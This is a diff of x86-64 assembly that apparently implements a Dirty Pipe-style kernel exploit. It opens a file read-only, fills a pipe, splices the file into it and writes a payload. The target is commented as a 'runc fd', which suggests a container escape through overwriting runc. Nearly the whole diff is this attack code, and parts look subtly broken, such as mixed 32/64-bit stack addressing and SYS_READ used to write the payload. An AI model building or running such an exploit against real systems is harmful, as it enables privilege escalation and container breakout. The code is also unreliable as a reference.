@@ -16,19 +16,18 @@ open:
     mov rax, SYS_OPEN
     mov rdx, 0
     mov rsi, O_RDONLY                          ;flags
-    mov rdi, runc                      ;filename
+    mov rdi, runc                                       ;filename
     syscall
 
-    cmp     rax, 0                        ; check for success
+    cmp     rax, 0                                        ; check for success
     jl      errorOnOpen
     mov qword [fileDesc], rax        
-    ;ret
 
 ; *******************
 ; prepare_pipe
 ; *******************
 prepare_pipe:
-    lea rdi, [rsp+12]               ; p
+    lea rdi, [ebp-65536-8]                                       ; p
     mov rax, SYS_PIPE
     syscall
 
@@ -38,8 +37,8 @@ prepare_pipe:
 ; *******************
 write: 
     mov rdx, PAGE_SIZE
-    lea rsi,  [ebp-65536]                         ;buffer
-    mov rdi, [ebp-65536-4]                           ; p[1]
+    lea rsi,  [ebp-65536]                                ;buffer
+    lea rdi, [ebp-65536-4]                           ; p[1]
     mov rax, SYS_WRITE
     syscall
 
@@ -72,11 +71,19 @@ splice:
 ; 
 ; *******************
 write_payload: 
-    mov rdx, MAX_LENGTH                     ; length
+    mov rdx, MAX_LENGTH                                ; length
     mov rsi,   payload                                             ; payload
-    lea rdi, [ebp-65536-4]                                             ; p[1]
+    lea rdi, [ebp-65536-4]                                       ; p[1]
     mov rax, SYS_READ
     syscall
+
+; *******************
+; exit
+; *******************
+exit:
+    mov       rax, SYS_EXIT
+    xor       rdi, rdi                      ; exit code 0
+    syscall                               ; invoke operating system to exit
 
 ; *******************
 ; errorOnOpen
@@ -93,14 +100,28 @@ printString:
     push    rbp
     mov     rbp, rsp 
     push    rbx
-
-; *******************
-; exit
-; *******************
-exit:
-    mov       rax, SYS_EXIT
-    xor       rdi, rdi                      ; exit code 0
-    syscall                               ; invoke operating system to exit
+    ;  Count characters in string.
+    mov     rbx, rdi
+    mov     rdx, 0 
+strCountLoop:
+    cmp     byte [rbx], NULL 
+    je      strCountDone     
+    inc     rdx
+    inc     rbx
+    jmp     strCountLoop
+strCountDone:
+    cmp     rdx, 0 
+    je      prtDone
+    ;  Call OS to output string.
+    mov     rax, SYS_WRITE                 ; code for write ()
+    mov     rsi, rdi                                   ; addr of characters
+    mov     rdi, STDOUT                        ; file descriptor
+                                                             ; count set above
+    syscall                                               ; system call
+prtDone:
+    pop     rbx
+    pop     rbp 
+    ret 
 
 section .data
     ; ********syscall*******
@@ -119,7 +140,7 @@ section .data
     PAGE_SIZE           equ 4096
     MAX_LENGTH equ 4095
     ; ********string*******
-    runc db '/tmp/fd' ; runc fd
+    runc db '/tmp/fd',NULL ; runc fd
     writeDone      db       "Write Completed.", LF, NULL
     errMsgWrite    db       "Error writing to file.", LF, NULL
     errMsgOpen         db    "Error opening the file.", LF, NULL
